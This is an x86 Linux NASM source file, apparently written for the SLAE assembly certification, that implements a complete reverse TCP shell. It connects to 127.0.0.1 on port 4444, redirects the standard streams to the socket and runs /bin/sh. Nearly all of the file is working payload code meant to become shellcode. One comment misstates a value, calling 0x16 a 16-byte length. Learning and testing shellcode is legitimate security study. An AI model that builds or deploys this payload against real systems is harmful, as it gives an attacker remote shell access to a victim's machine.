; Filename: ShellReverseTCP.nasm
; Author:  David Alvarez Robles (km0xu95)
; Website:  https://blog.asturhackers.es
;
; Purpose: This assembly file has been created for completing the requirements of the SecurityTube Linux Assembly Expert (SLAE) certification

; Define entry point
global _start			

; Start text section
section .text
_start:

; Socket creation: int socket(int domain, int type, int protocol) -> Return value: file descriptor
socket_creation:
	xor eax, eax	; Clear EAX register
	mov ebx, eax	; Clear EBX register
	push eax	; Protocol must be 0 (default)
	push 0x01	; Type must be 1 (SOCK_STREAM)
	push 0x02	; Domain must be 2 (AF_INET)
	mov al, 102	; Move 102 to AL register (socketcall syscall) 
	inc ebx		; Place 1 in EBX register (socket() is number 1 in socketcall)
	mov ecx, esp	; Pointer to arguments structure for socket()
	int 0x80	; Make syscall
	mov edx, eax	; Save file descriptor returned by socket()


; Socket connection: int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) -> Return value: "0" or "-1"
socket_connect:
	xor esi, esi	 	; Clear ESI register
	push 0x0100007F		; Push 127.0.0.1 (this address contains null bytes)
	push word 0x5C11 	; Push 115C value (4444 in decimal) for port number
	push word 0x2	 	; Push family value (AF_INET which is 2)
	mov esi, esp	 	; Pointer to addr structure for connect()
	push 0x16	 	; Push 16 bytes length (addrlen) to the stack
	push esi	 	; Push pointer to addr structure
	push edx	 	; Push socket file descriptor
	mov al, 102	 	; Move 102 to AL register (socketcall syscall) 
	add ebx, 2	 	; Place 3 in EBX register (connect() is number 3 in socketcall)
	mov ecx, esp	 	; Pointer to arguments structure for connect()
	int 0x80	 	; Make syscall


; File descriptor duplication: int dup2(int oldfd, int newfd) -> Return value: file descriptor for new socket or "-1"
descriptors_duplication:
	mov ebx, edx	 ; Save old file descriptor into EBX register (file descriptor from socket)
	xor ecx, ecx	 ; Clear ECX register
	mov cl, 2	 ; Move 2 to ECX register which is new file descriptor for first iteration

duplicate_fd:
	mov al, 63	 ; Move 63 to AL register (dup2 syscall)
	int 0x80	 ; Make syscall
	dec ecx		 ; Decrement ECX register by 1
	jns duplicate_fd ; Jump if not sign (if not -1) to duplicate next file descriptor


; Execve call: int execve(const char *pathname, char *const argv[], char *const envp[]) -> Return value: None or "-1"
execve:
	xor eax, eax	; Clear EAX register
	push eax	; Push null bytes
	push 0x68732f6e	; Push "hs/n" to stack
	push 0x69622f2f	; Push "ib//" to stack
	mov ebx, esp	; Move to EBX register pointer to "//bin/sh" string
	push eax	; Push null bytes
	push ebx	; Push the pointed address
	mov ecx, esp	; Move to ECX pointer to address of "//bin/sh" plus null bytes
	xor edx, edx	; Clear EDX register
	mov al, 11	; Move 11 to AL register (execve syscall)
	int 0x80	; Make syscall
		
